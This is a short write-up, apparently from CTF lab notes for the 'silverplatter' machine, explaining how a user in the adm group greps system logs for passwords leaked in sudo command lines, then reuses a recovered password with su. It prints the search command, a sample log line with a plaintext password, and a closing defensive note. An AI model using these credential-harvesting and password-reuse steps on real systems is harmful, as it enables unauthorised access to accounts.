# Syslog Credential Leak via Command Execution

Used on: **silverplatter**

System logs (`/var/log/syslog`, `/var/log/auth.log`) record elevated commands executed via `sudo`. If an administrator passes sensitive credentials as command-line arguments or environment variables to a command executed with `sudo`, these credentials get recorded in plaintext in the logs.

## Prerequisites

- A foothold as a user belonging to the `adm` group (or root), which grants read permissions to `/var/log/`.
- An administrator who previously executed commands with plaintext credentials.

## Steps

### 1. Verify Group Membership

Check if the current user belongs to the `adm` group.

```bash
id
# uid=1000(tim) gid=1000(tim) groups=1000(tim),4(adm)
```

### 2. Search Logs for Credentials

Recursively search the `/var/log/` directory for keywords like `password`, `passwd`, or `secret`.

```bash
grep -r -E -i 'password|passwd|PASSWORD' /var/log/ 2>/dev/null
```

### 3. Identify Leaked Passwords

The grep output may reveal `sudo` commands invoked by other users containing inline passwords.

```text
Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/
```

In this example, the user `tyler` passed a database password as an environment variable (`-e DB_PASSWORD=_Zd_zx7N823/`) during a `docker run` command via `sudo`, permanently logging it.

### 4. Password Reuse

Attempt to use the recovered password to switch to the user who executed the command or to access other internal services like SSH or databases.

```bash
su tyler
# Password: _Zd_zx7N823/
```

## Defensive Note

Never pass plaintext secrets, passwords, or tokens via command-line arguments or inline environment variables (`-e`). Use secure secret management solutions, Docker secrets, or `.env` files with appropriately restricted permissions.
